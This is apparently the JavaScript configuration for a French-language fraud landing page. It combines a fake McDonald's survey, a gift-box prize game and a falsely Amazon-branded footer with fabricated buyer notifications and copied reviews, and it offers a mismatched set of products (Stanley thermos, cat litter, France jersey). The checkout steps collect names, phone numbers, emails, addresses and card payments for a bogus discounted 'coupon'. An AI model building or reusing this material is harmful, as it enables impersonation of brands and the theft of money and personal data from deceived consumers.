const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "fr";
  const lang = "fr-FR";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Taille : ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };

  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    timer: "Vous ne pouvez commander qu'un seul paquet au prix promotionnel cette semaine.",
    text: `
  Félicitations!<br><br>
  Vous avez participé à la promotion Stanley : vous avez la chance d'acheter la thermos STANLEY QUENCHER H2.0 avec moule à glace pour seulement <b>37$</b> !
  `,
  };

  const notifications = [
    {
      user: "Manuel S*****",
      location: "Paris, France",
      action: "Je viens de recevoir le bijou pour 1,95 euro !",
      timeago: "il y a 15 secondes",
    },
    {
      user: "Carlos B******",
      location: "Marseille, France",
      action: "Je viens de recevoir le bijou pour 1,95 euro !",
      timeago: "il y a 25 secondes",
    },
  ];

  const reviewsArr = [
    {
      name: "Sophie R.",
      time: "Il y a un jour",
      header: "Cette litière est vraiment incroyable.",
      image: "./src/img/review_1.jpg",
      review: "J'ai deux chats qui lâchent des monstres quand ils vont à la litière, et ils y vont TRES souvent. Après avoir testé bien des litières, celle-ci est vraiment la meilleure possible. Après s'être habitué-e à l'odeur de paille (forcément puisque naturelle et c'est pas plus mal), on est ravi-e. Elle absorbe super bien et surtout masque ABSOLUMENT toutes les odeurs très rapidement, contrairement à toutes les autres que j'ai pu tester (et j'ai fait le tour). Seul bémol, depuis quelques temps maintenant, elle est que très peu disponible sur Amazon car toujours en rupture ou que sais-je. C'est dommage, mais je me rabattrai sur une animalerie qui livre la prochaine fois, c'est pas pratique de devoir sauter dessus quand elle est dispo pour prévoir le stock alors qu'on vient d'en acheter une autre pour compenser.",
    },
    {
      name: "Alexandre",
      time: "Il y a deux jours",
      header: "C'est la meilleure litière à ma connaissance.",
      image: "./src/img/review_2.jpg",
      review: "Absorbe les odeurs, on retire les excréments au fur et à mesure que l'on vide dans les sanitaires. Le reste va dans le compost. 👌",
    },
    {
      name: "Cozic Raphael",
      time: "Il y a deux jours",
      header: "Simplement incroyable.",
      image: "./src/img/review_3.jpg",
      review: "De loin C’est de loin la meilleure litière végétale qu’il existe , mon chat ne veut pas autre chose , absorbe bien , neutralise les odeurs à condition de débarrasser tout les jours les boules d’urines et les caca . J’aime aussi le fait qu’avec la pelle on peut jeter au toilette , une chasse d’eau et hop tout s’en va . Pas besoin de sac et de stocker dans les poubelles . Vite évacuer .",
    },
    {
      name: "Hyper Efficace",
      time: "Il y a quatre jours",
      header: "J'aime ça",
      image: "./src/img/review_4.jpg",
      review: "Agglomère bien sans faire soupe. Ne colle pas trop au fond contrairement à d'autres types de litière. <br> Transport parfait",
    },
    {
      name: "Bour Laurent",
      time: "Il y a sept jours",
      header: "Wow, j'adore ce produit !",
      image: "./src/img/review_5.jpg",
      review: "Après avoir essayé de multiples types de litière, celle-ci est celle qui convient le mieux. Prix intéressant sur ce packaging grand modèle de 40L.",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "ÉVALUATIONS ET AVIS",
    percent: "99%",
    rec: "Commentaires sur cette promotion",
  };

  const questions = {
    _of: "Question {1} sur {2} :",
    arr: [
      {
        q: "Avez-vous déjà commandé des produits McDonald's ?",
        a: [
          "Oui, je commande souvent",
          "Oui, je commande rarement",
          "Je n'ai jamais commandé",
        ],
      },
      {
        q: "McDonald's devrait-il continuer ce type de campagnes publicitaires ?",
        a: ["Oui, bien sûr !", "Oui, mais changez le menu promotionnel", "Non"],
      },
      {
        q: "Recommanderiez-vous nos produits à vos amis ?",
        a: ["Oui", "Non"],
      },
    ],
  };

  const check = {
    title: "Votre réponse est en cours d'évaluation",
    arr: [
      "Vous avez répondu à la question 3 sur 3",
      "Votre adresse IP ne montre aucune commande précédente",
      "Votre réponse a été vérifiée",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Merci d'avoir participé au sondage !",
        button: "Essayez votre chance",
        text: `
      <center>
      Pour obtenir le menu promotionnel de McDonald's, vous devez choisir la bonne boîte-cadeau.
      <br><br>
      Vous avez 3 tentatives, bonne chance !
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh non...",
        button: "Réessayer",
        text: `
      <center>
      Malheureusement, cette boîte-cadeau est vide. Il vous reste deux tentatives, bonne chance !
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: "Maillot Domicile de l'Équipe de France (Hommes) 2024/25",
        button: "Obtenez le coupon",
        text: `
      <center>
      <p style="color: #ffffff"></p>
      <br>
      Cliquez sur "Obtenez le coupon", remplissez le formulaire et payez la commande.
      <br><br>
      Recevez un SMS avec le coupon et des instructions pour l'activer.
      <br><br>
      Le coupon peut être activé à tout moment et ne nécessite aucun paiement supplémentaire.
      </center>
    `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Informations personnelles",
      fields: {
        name: {
          enabled: true,
          field: "Prénom",
        },
        family: {
          enabled: true,
          field: "Nom de famille",
        },
        phone: {
          enabled: true,
          field: "Numéro de téléphone",
        },
        email: {
          enabled: true,
          field: "Adresse e-mail",
        },
      },
    },
    delivery: {
      title: "Livraison",
      fields: {
        city: {
          enabled: true,
          field: "Ville",
        },
        address: {
          enabled: true,
          field: "Adresse de livraison",
        },
        zip: {
          enabled: true,
          field: "Code postal",
        },
      },
    },
    payment: {
      title: "Modes de paiement",
      creditCard: "Paiement en ligne par carte de crédit",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Détails de la commande",
      oldPrice: "99,99 €",
      newPrice: "9,99 €",
      size: "Taille",
      subTotal: {
        title: "Sous-total",
        amount: "9,99 €",
      },
      delivery: {
        title: "Livraison",
        amount: "0,00 €",
      },
      total: {
        title: "Total",
        amount: "9,99 €",
      },
      checkoutButton: "Payer votre commande",
    },
  };

  const products = [
    {
      id: "26468784",
      name: "Cat’s Best Original - litière pour chats agglutinante - 40L / 17.2kg",
      miniImg: "./src/img/slide1.jpg",
      images: ["./src/img/slide1.jpg"],
    },
  ];

  const footer = {
    cr: "© 2024 Amazon. Tous droits réservés.",
  };


  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  // document
  //   .querySelector(".checkout_header")
  //   .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});